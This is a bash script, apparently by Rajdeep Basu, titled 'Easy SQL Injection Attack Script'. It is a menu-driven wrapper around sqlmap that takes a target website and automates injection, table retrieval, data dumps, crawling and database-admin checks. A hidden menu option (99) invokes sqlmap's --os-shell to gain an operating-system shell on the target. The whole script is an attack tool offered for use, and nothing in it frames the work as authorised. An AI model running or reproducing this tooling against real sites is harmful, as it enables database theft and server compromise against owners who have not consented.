wog='\033[1;100m'
off='\033[0m'
fgr='\033[1;90m'
fr='\033[1;31m'
fg='\033[1;32m'
fy='\033[1;33m'
fb='\033[1;34m'
fp='\033[1;35m'
fs='\033[1;36m'
fw='\033[1;37m'
bow='\033[1;07m'
br='\033[0;41m'
bg='\033[0;42m'
by='\033[0;43m'
bb='\033[0;44m'
bp='\033[0;45m'
bs='\033[0;46m'
bw='\033[0;47m'
bk='\033[0;30m'
un='\033[0;04m'
it='\033[0;03m'
none=
clear 
echo -e $off ""

echo -e $wog $fy " EASY SQL INJECTION ATTACK SCRIPT " $off
echo -e $wog "  WRITTEN BY RAJDEEP BASU " $off

figlet ESIAC 

bash /$HOME/sqlmap/outman
echo -e $fb"[>]enter the website :"$fy" \c"$off
read url 
echo -e $off
cd /$HOME/sqlmap/temp 
echo -e "site : $url" >> current_site.txt
echo -e $fs"site : $url \n\n" >> log.txt 


while [ 1 ]
do
cd 
cd sqlmap 
echo -e $fr"[>] TARGET WEBSITE = $url"
echo -e $off""
echo -e $wog"[]============ M E N U =============[]"$off
echo -e $wog"[] "$fg"1.automatic database retrieval   "$off$wog"[]"$off
echo -e $wog"[] "$fg"2.manual database retrieval      "$off$wog"[]"$off
echo -e $wog"[] "$fg"3.retrieval of tables or column  "$off$wog"[]"$off
echo -e $wog"[] "$fg"4.dump section                   "$off$wog"[]"$off
echo -e $wog"[] "$fg"5.go to output folder            "$off$wog"[]"$off
echo -e $wog"[] "$fg"6.for firebird databases         "$off$wog"[]"$off
echo -e $wog"[] "$fg"7.crawl the site                 "$off$wog"[]"$off
echo -e $wog"[] "$fg"8.database administration finder "$off$wog"[]"$off
echo -e $wog"[] "$fg"9.TRY AGAIN                      "$off$wog"[]"$off
echo -e $wog"[] "$fr"0.exit                           "$off$wog"[]"$off
echo -e $wog"[]==================================[]"$off
echo -e $off""
echo -e $wog"[>]Your choice is :"$fs" \c " $off
read choice 



if [ $choice -eq 0 ]
then 
clear 
echo -e $gp"[>] TARGET WEBSITE = $url"
echo -e ""
echo -e $fg"EXITING..." $off 
echo -e $off
exit 
fi 

if [ $choice -eq 1 ]
then 
echo -e $fp"[>] TARGET WEBSITE = $url"
echo -e $off""
echo -e $wog"[===============================] "$off
echo -e $wog"|  AUTOMATIC INJECTION PROCESS  | "$off
echo -e $wog"[===============================] "$off
echo -e $off""

bash sqlauto $url 

fi

if [ $choice -eq 2 ]
then
echo -e $fp"[>] TARGET WEBSITE = $url"
echo -e $off""
echo -e $wog"[================================] "$off
echo -e $wog"|   MANUAL  INJECTION  PROCESS   | "$off
echo -e $wog"[================================] "$off
echo -e $off""

bash sqlman $url 

fi

if [ $choice -eq 3 ]
then
echo -e $off""   
echo -e $wog"[================================] "$off
echo -e $wog"|           RETRIEVAL            | "$off
echo -e $wog"[================================] "$off
echo -e $off""
echo -e $fp"[>] TARGET WEBSITE = $url"f
echo -e $off""

bash sqlret $url 

fi 

if [ $choice -eq 4 ]
then 
echo -e $off""  
echo -e $wog"[================================] "$off
echo -e $wog"|        DATA DUMP SECTION       | "$off 
echo -e $wog"[================================] "$off
echo -e $off""
echo -e $fp"[>] TARGET WEBSITE = $url"
echo -e $off""

bash sqldump $url 

fi 

if [ $choice -eq 5 ]
then 
echo -e $off"" 
echo -e $wog"[================================] "$off
echo -e $wog"|          OUTPUT FOLDER         | "$off  
echo -e $wog"[================================] "$off
echo -e $off""
echo -e $fr "COPY :  cd /$HOME/.local/share/sqlmap/output  " 
echo -e $off 
exit 
fi

if [ $choice -eq 6 ] 
then
echo -e $off""       
echo -e $wog"[================================] "$off
echo -e $wog"|    FIREBIRD  DBMS  SECTION     | "$off 
echo -e $wog"[================================] "$off
echo -e $off""
echo -e $fp"[>] TARGET WEBSITE = $url"
echo -e $off 
sqlmap -u $url --risk=3 --level=5 --no-cast --ignore-proxy --random-agent --tables 

fi

if [ $choice -eq 7 ] 
then
echo -e $off""   
echo -e $wog"[================================] "$off
echo -e $wog"|   CRAWLING FOR SQL INJECTION   | "$off  
echo -e $wog"[================================] "$off
echo -e $off""
echo -e $fp"[>] TARGET WEBSITE = $url"
echo -e $off 
echo -e $by$fr "CRAWLING STARTED " $off
echo -e $off

sqlmap -u $url --crawl=10

fi 

if [ $choice -eq 8 ]
then
echo -e $off"" 
echo -e $wog"[================================] "$off
echo -e $wog"|        LOOKING FOR DBA         | "$off
echo -e $wog"[================================] "$off
echo -e $off""
echo -e $fp"[>] TARGET WEBSITE = $url"
echo -e $off 
# cd && bash /$HOME/sqlmap/twaf $url 
sqlmap -u $url --risk=3 --level=5 --no-cast --ignore-proxy --random-agent --thread=5  --is-dba 

fi 

if [ $choice -eq 9 ]
then 
sql 
fi

if [ $choice -eq 99 ]
then 
echo -e $off""
echo -e $wog"[================================] "$off
echo -e $wog"|            OS SHELL            | "$off
echo -e $wog"[================================] "$off
echo -e $off""
sqlmap -u $url --thread=5 --os-shell 
fi 
done 
echo -e $off 

